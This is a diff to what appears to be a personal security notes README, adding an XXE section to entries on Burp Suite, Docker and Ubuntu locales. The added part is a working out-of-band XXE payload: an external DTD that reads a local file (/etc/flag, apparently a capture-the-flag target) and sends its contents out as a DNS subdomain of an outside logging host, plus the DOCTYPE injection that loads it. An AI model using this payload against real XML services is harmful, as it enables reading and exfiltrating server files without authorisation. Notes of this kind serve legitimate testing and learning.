@@ -5,6 +5,8 @@
 - [Burp Suite Professional](#burp-suite-professional)
 - [Docker](#docker)
 - [Ubuntu](#ubuntu)
+- [Web Applications Security](#web-applications-security)
+   + [XML eXternal Entity (XXE)](#XML-eXternal-Entity-(XXE))
 
 ## Burp Suite Professional
 ### Running own collaborator:  
@@ -28,4 +30,20 @@ Install polish locale:
 
 Setup locales:  
 `update-locale LANG=pl_PL.utf8`
+
+## Web Applications Security
+### XML eXternal Entity (XXE)
+#### Exfiltrate in subdomain name:  
+dtd file without .dtd extension _(test.html)_:  
+```xml
+<!ENTITY % file SYSTEM "file:///etc/flag">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.b0f4f2d1d89d4ec413ad.d.zhack.ca'>">
+%eval;
+%exfiltrate;
+```  
+Injection:
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///tmp/test.html"> %xxe;]>
+```  
+http://dnsbin.zhack.ca/
 
